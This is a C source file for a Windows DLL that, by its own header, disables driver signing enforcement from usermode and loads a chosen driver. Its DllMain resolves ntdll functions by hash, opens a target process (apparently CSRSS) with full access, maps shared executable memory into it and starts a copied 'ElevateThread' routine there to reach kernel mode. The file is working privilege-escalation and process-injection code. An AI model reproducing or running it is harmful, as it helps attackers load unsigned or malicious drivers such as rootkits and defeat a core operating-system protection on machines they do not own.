/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Executes NtUserHardErrorControl in the context of 
 * CSRSS to elevate the current thread to KernelMode
 * and disable DSE.
 *
**/

D_SEC( B ) BOOL WINAPI DllMain( _In_ HINSTANCE Instance, _In_ DWORD Reason, _In_ LPVOID Parameter ) 
{
	SIZE_T			Len = 0;
	LPVOID			Lvw = NULL;
	LPVOID			Rvw = NULL;

	LPVOID			PRv = NULL;
	LPVOID			PLv = NULL;
	HANDLE			PSc = NULL;

	HANDLE			Sec = NULL;
	HANDLE			Cur = NULL;
	HANDLE			Prc = NULL;
	HANDLE			Thd = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	API			Api;
	CLIENT_ID		Cid;
	LARGE_INTEGER		Lig;
	OBJECT_ATTRIBUTES	Obj;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Lig, sizeof( Lig ) );
	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.NtUnmapViewOfSection  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.RtlCreateUserThread   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );
	Api.NtMapViewOfSection    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTMAPVIEWOFSECTION );
	Api.NtCreateSection       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATESECTION );
	Api.NtOpenProcess         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
	Api.NtClose               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Cur = ( ( HANDLE ) - 1 );
	Obj.Length = sizeof( Obj );

	Dos = C_PTR( Instance );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Cid.UniqueProcess = C_PTR( U_PTR( Nth->FileHeader.NumberOfSymbols ) );

	if ( !( Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Obj, &Cid ) >= 0 ) ) {
		goto Leave;
	};

	Len = 0;
	Lig.QuadPart = U_PTR( G_END() - G_SYM( ElevateThread ) );

	if ( Api.NtCreateSection( &Sec, SECTION_ALL_ACCESS, NULL, &Lig, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL ) >= 0 ) {
		if ( !( Api.NtMapViewOfSection( Sec, Cur, &Lvw, 0, 0, 0, &Len, ViewShare, 0, PAGE_EXECUTE_READWRITE ) >= 0 ) ) {
			goto Leave;
		};
		if ( !( Api.NtMapViewOfSection( Sec, Prc, &Rvw, 0, 0, 0, &Len, ViewShare, 0, PAGE_EXECUTE_READWRITE ) >= 0 ) ) {
			goto Leave;
		};

		Len = 0;
		Lig.QuadPart = sizeof( CLIENT_ID );

		if ( !( Api.NtCreateSection( &PSc, SECTION_ALL_ACCESS, NULL, &Lig, PAGE_READWRITE, SEC_COMMIT, NULL ) >= 0 ) ) {
			goto Leave;
		};
		if ( !( Api.NtMapViewOfSection( PSc, Cur, &PLv, 0, 0, 0, &Len, ViewShare, 0, PAGE_READWRITE ) >= 0 ) ) {
			goto Leave;
		};
		if ( !( Api.NtMapViewOfSection( PSc, Prc, &PRv, 0, 0, 0, &Len, ViewShare, 0, PAGE_READWRITE ) >= 0 ) ) {
			goto Leave;
		};

		( ( PCLIENT_ID ) PLv )->UniqueProcess = Nth->FileHeader.TimeDateStamp;
		( ( PCLIENT_ID ) PLv )->UniqueThread  = Nth->FileHeader.PointerToSymbolTable;

		__builtin_memcpy( Lvw, C_PTR( G_SYM( ElevateThread ) ), U_PTR( G_END() - G_SYM( ElevateThread ) ) );

		if ( ! Api.RtlCreateUserThread(
				Prc,
				NULL,
				FALSE,
				0,
				0,
				0,
				Rvw,
				PRv,
				&Thd,
				NULL
		) )
		{
			Api.NtWaitForSingleObject( Thd, FALSE, NULL );
		} else {
			goto Leave;
		};
	} else {
		goto Leave;
	};
Leave:
	if ( Thd != NULL ) {
		Api.NtClose( Thd );
	};
	if ( PRv != NULL ) {
		Api.NtUnmapViewOfSection( Prc, PRv );
	};
	if ( PLv != NULL ) {
		Api.NtUnmapViewOfSection( Cur, PLv );
	};
	if ( Rvw != NULL ) {
		Api.NtUnmapViewOfSection( Prc, Rvw );
	};
	if ( Lvw != NULL ) {
		Api.NtUnmapViewOfSection( Cur, Lvw );
	};
	if ( Sec != NULL ) {
		Api.NtClose( Sec );
	};
	if ( PSc != NULL ) {
		Api.NtClose( PSc );
	};
	if ( Prc != NULL ) {
		Api.NtClose( Prc );
	};
	return FALSE;
};
